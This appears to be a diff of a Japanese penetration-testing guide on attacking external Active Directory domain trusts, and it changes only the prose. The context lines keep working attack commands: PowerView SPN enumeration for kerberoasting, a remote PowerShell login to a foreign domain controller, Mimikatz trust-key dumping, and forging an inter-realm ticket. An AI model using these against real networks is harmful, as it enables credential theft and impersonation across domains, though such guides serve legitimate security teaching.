@@ -60,7 +60,7 @@ IsDomain     : True
 
 ## 初期アクセス
 
-他のドメインでユーザーの**特別な**アクセスを見つけられなかった場合でも、ADメソッドに戻り、**特権のないユーザーからのプライベートエスカレーション**を試みることができます（例えば、kerberoastingなど）：
+他のドメインでユーザーの**特別な**アクセスを見つけられなかった場合でも、ADメソッドに戻り、**特権のないユーザーからの昇格**を試みることができます（例えば、kerberoastingなど）：
 
 **Powerview関数**を使用して、`-Domain`パラメータを使って**他のドメイン**を**列挙**できます。
 ```powershell
@@ -74,7 +74,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### ログイン
 
-外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でアクセスできるはずです:
+外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でログインすることで、次の内容にアクセスできるはずです：
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
@@ -91,7 +91,7 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-現在のドメインのユーザーを**偽装する**TGTを**信頼された**キーで**署名する**ことができます。
+現在のドメインのユーザーを**偽装するTGTを**、**信頼された**キーで**署名する**ことができます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
